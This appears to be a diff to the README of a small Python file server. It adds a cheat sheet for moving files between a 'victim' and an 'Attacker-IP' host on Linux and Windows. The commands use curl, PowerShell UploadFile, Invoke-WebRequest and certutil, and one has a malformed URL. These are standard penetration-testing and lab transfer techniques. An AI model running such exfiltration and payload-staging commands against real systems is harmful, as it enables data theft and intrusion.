@@ -41,11 +41,26 @@ python3 file_server.py
   - Use the upload form to send files to the current folder.
   - Uploaded files will be saved in the exact subdirectory you're viewing.
 
-## 📤 Upload via Command Line (curl)
+## 📤 Upload & Download via Command Line (curl)
 
-- You can upload files directly using the PUT method:
-  - Upload to root:
-    - `curl -T ./example.txt http://<server-ip>:8080/example.txt`
+### Linux
+#### Upload
+  - `curl -T file http://Attacker-Ip:8080` # Upload file from victim to Attacker
+#### Download
+  - `wget http//Attacker-IP:8080`
+
+
+
+### Windows
+
+#### Upload
+- `curl -T C:\Users\Public\file.txt http://Attacker-ip:8080/`
+- `$WebClient.UploadFile("http://Attacker:8080/file.txt", "PUT", "C:\Users\Public\file.txt")`
+
+#### Download 
+  - `Invoke-WebRequest -Uri "http://Attacker-ip:8080/file.txt" -OutFile "C:\Users\Public\file.txt"`
+  - `certutil -urlcache -split -f "http://Attakcer-ip:8080/file.txt" "C:\Users\Public\file.txt"`
+  - `curl -o C:\Users\Public\file.txt http://10.10.1.212:8080/file.txt`
 
 
 ## 🛡 Security Warning
